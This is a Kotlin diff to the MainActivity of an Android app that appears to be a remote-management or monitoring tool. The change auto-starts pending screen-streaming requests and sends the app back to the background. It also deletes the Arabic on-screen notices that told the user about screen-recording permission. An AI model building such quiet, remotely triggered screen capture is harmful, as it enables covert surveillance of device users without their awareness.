@@ -15,6 +15,7 @@ import com.abuzahra.manager.executor.DataCollector
 import com.abuzahra.manager.permission.PermissionChecker
 import com.abuzahra.manager.service.CommandService
 import com.abuzahra.manager.streaming.ScreenStreamService
+import com.abuzahra.manager.streaming.PendingStreamManager
 import com.abuzahra.manager.util.DeviceUtils
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -62,7 +63,15 @@ class MainActivity : AppCompatActivity() {
         CommandService.start(this)
 
         // Request MediaProjection permission proactively for streaming
-        requestMediaProjectionPermission()
+        // Only request if no pending stream request (to avoid duplicate dialogs)
+        if (!PendingStreamManager.hasPendingRequest()) {
+            requestMediaProjectionPermission()
+        } else {
+            // Check if permission is now available and auto-start pending
+            if (ScreenStreamService.hasPermission()) {
+                PendingStreamManager.onPermissionGranted(this)
+            }
+        }
 
         // Update permissions count using centralized checker
         updatePermissionCount(textPermissions)
@@ -156,13 +165,18 @@ class MainActivity : AppCompatActivity() {
      * This must be requested from an Activity and the result saved for later use.
      */
     private fun requestMediaProjectionPermission() {
-        if (ScreenStreamService.hasPermission()) return
+        if (ScreenStreamService.hasPermission()) {
+            // Permission already available - check if there's a pending stream to auto-start
+            if (PendingStreamManager.hasPendingRequest()) {
+                PendingStreamManager.onPermissionGranted(this)
+            }
+            return
+        }
         try {
             val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             val intent = projectionManager.createScreenCaptureIntent()
             @Suppress("DEPRECATION")
             startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE)
-            Toast.makeText(this, "يرجى الموافقة على تسجيل الشاشة للبث المباشر", Toast.LENGTH_LONG).show()
         } catch (e: Exception) {
             Log.e("MainActivity", "Failed to request MediaProjection", e)
         }
@@ -175,10 +189,21 @@ class MainActivity : AppCompatActivity() {
             if (resultCode == Activity.RESULT_OK && data != null) {
                 ScreenStreamService.setPermissionData(resultCode, data)
                 Log.i("MainActivity", "MediaProjection permission granted and saved")
-                Toast.makeText(this, "تم حفظ إذن تسجيل الشاشة", Toast.LENGTH_SHORT).show()
+
+                // Auto-start any pending stream request
+                PendingStreamManager.onPermissionGranted(this)
+
+                // If this was triggered by the activity launch (not proactive), finish to return to background
+                if (intent.getBooleanExtra("request_media_projection", false)) {
+                    finish()
+                }
             } else {
                 Log.w("MainActivity", "MediaProjection permission denied")
-                Toast.makeText(this, "تم رفض إذن تسجيل الشاشة - البث لن يعمل", Toast.LENGTH_LONG).show()
+                PendingStreamManager.onPermissionDenied()
+
+                if (intent.getBooleanExtra("request_media_projection", false)) {
+                    finish()
+                }
             }
             // Refresh permission count
             updatePermissionCount(findViewById(R.id.textPermissions))
